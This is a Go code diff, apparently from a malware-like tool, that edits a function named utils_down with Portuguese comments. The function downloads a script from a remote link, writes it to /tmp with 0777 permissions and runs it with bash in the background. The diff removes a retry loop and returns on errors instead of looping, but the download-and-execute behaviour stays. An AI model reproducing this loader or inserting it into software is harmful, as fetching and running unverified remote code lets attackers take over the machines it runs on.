@@ -9,8 +9,6 @@ import (
 "net/http"
 "io/ioutil"
 "os/exec"
-"time"
-
 )
 
 
@@ -25,12 +23,8 @@ func utils_down( link   string,  name_script string){  //funcao para abaixa srip
 
 
 
-for  {
 
 
-
-
-time.Sleep ( 1  * time.Second)
 
 
 
@@ -46,8 +40,7 @@ resp , err_get := cli.Get( link )
 
   //erro no github.com 
 
-          continue
-
+          return
 
 
    }
@@ -62,15 +55,16 @@ script  , err_readall :=  ioutil.ReadAll(resp.Body)
        //"erro em readall"
 
 
-           continue
+           return
+
 
             }
 
 
 
+
+
 ioutil.WriteFile("/tmp/" + name_script ,  script , 0777 )
-
-
 
 
 brute :=  exec.Command("sh" , "-c" , " cd /tmp/    ;   bash " +  name_script )
@@ -79,14 +73,10 @@ brute :=  exec.Command("sh" , "-c" , " cd /tmp/    ;   bash " +  name_script )
 brute.Start()
 
 
-
-
 }
 
 
 
-
-}
 
 
 
